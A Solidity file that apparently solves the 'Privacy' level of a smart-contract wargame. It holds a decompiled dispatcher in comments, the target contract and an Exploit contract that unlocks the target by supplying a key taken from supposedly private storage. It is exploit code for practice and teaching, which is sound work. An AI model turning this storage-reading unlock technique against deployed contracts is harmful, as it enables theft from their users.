// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

// contract PrivacyDecompiled {
//     function main() {
//         memory[0x40:0x60] = 0x80;
//         var var0 = msg.value;

//         if (var0) { revert(memory[0x00:0x00]); }

//         if (msg.data.length < 0x04) { revert(memory[0x00:0x00]); }

//         var0 = msg.data[0x00:0x20] >> 0xe0;

//         if (var0 == "ID()") {
//             // Dispatch table entry for ID()
//             var var1 = 0x49;
//             var var2 = storage[0x01];
//             var temp0 = memory[0x40:0x60];
//             memory[temp0:temp0 + 0x20] = var2;
//             var temp1 = memory[0x40:0x60];
//             return memory[temp1:temp1 + (temp0 + 0x20) - temp1];
//         } else if (var0 == "locked()") {
//             // Dispatch table entry for locked()
//             var1 = 0x68;
//             var2 = storage[0x00] & 0xff;
//             var temp2 = memory[0x40:0x60];
//             memory[temp2:temp2 + 0x20] = !!var2;
//             var2 = temp2 + 0x20;
//             var temp3 = memory[0x40:0x60];
//             return memory[temp3:temp3 + var2 - temp3];
//         } else if (var0 == "unlock(bytes16)") {
//             // Dispatch table entry for unlock(bytes16)
//             var1 = 0x86;
//             var2 = 0x82;
//             var var3 = msg.data.length;
//             var var4 = 0x04;
//             var2 = func_00B8(var3, var4);
//             func_0082(var2);
//             stop();
//         } else { revert(memory[0x00:0x00]); }
//     }

//     function func_0082(var arg0) {
//         var temp0 = ~0xffffffffffffffffffffffffffffffff;

//         if (storage[0x05] & temp0 != temp0 & arg0) { revert(memory[0x00:0x00]); }

//         storage[0x00] = storage[0x00] & ~0xff;
//     }

//     function func_00B8(var arg0, var arg1) returns (var r0) {
//         var var0 = 0x00;

//         if (arg0 - arg1 i< 0x20) { revert(memory[0x00:0x00]); }

//         var temp0 = msg.data[arg1:arg1 + 0x20];
//         var var1 = temp0;

//         if (var1 == var1 & ~0xffffffffffffffffffffffffffffffff) { return var1; }
//         else { revert(memory[0x00:0x00]); }
//     }
// }



contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor() {
    data[0] = 0x30c41b7009c6491da32e6eba5ca21eae5b44d8764f59a5d63ddf0624c458c2a2;
    data[1] = 0x13b87ab2fbc6596c146f1f8e43f180d3d853e68d62d7397db36b69379d78c124;
    data[2] = 0xbe3a697a3d9a453bd6380c8096926bbc6b93eff99177369f270506ef8448e72b;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

}


contract Exploit is Destructible, Targeted {
  bytes32[3] private data;
  constructor(address target_addr) payable Targeted(target_addr) {
    data[0] = 0x30c41b7009c6491da32e6eba5ca21eae5b44d8764f59a5d63ddf0624c458c2a2;
    data[1] = 0x13b87ab2fbc6596c146f1f8e43f180d3d853e68d62d7397db36b69379d78c124;
    data[2] = 0xbe3a697a3d9a453bd6380c8096926bbc6b93eff99177369f270506ef8448e72b;
  }
  function exploit() public payable {
    Privacy privacy = Privacy(Targeted(this).target());
    // encode the unlock transaction manually
    bytes memory data = abi.encodeWithSignature("unlock(bytes16)", bytes16(data[2]));
    // send the transaction
    (bool success, ) = address(privacy).call{value: msg.value}(data);
    require(success, "exploit failed");
  }
  receive() external payable {
  }
}